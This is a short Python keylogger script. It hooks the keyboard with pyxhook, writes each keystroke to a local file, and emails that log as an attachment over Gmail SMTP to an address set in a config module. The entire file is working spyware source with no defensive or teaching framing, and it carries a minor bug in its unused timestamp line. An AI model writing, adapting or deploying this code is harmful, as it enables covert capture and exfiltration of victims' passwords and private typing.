import os
from datetime import datetime
import pyxhook
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import config

def OnKeyPress(event):
    log_file = f'{os.getcwd()}/logged.txt'
    d = datetime.datetime.now()
    with open(log_file, "a") as file:
        if event.Key == 'P_Enter' :
            file.write('\n')
        else:
            file.write(f"{chr(event.Ascii)}")
    
def send_email():
    email_user=config.email_user
    email_password=config.email_password
    email_to_send=config.email_to_send
    subject = 'K3y|0gg3r'
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_to_send
    msg['Subject'] = subject
    body = 'New file!'
    msg.attach(MIMEText(body,'plain'))
    filename='logged.txt'
    attachment =open(filename,'rb')
    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)
    try:
        server.sendmail(email_user,email_to_send,text)
    except:
        print("Did not send email\n")
    server.quit()

def start_key_logger():
        log_file = f'{os.getcwd()}/logged.txt'
        file=open(log_file,"a")
        file.write('\n'+datetime.now().strftime("%d-%m-%Y|%H:%M")+':')
        file.close()
        send_email()
        new_hook = pyxhook.HookManager()
        new_hook.KeyDown = OnKeyPress
        new_hook.HookKeyboard()
        try:
            new_hook.start()
        except:
            pass

def main():
    start_key_logger()
    
if __name__ == "__main__":
    main()
    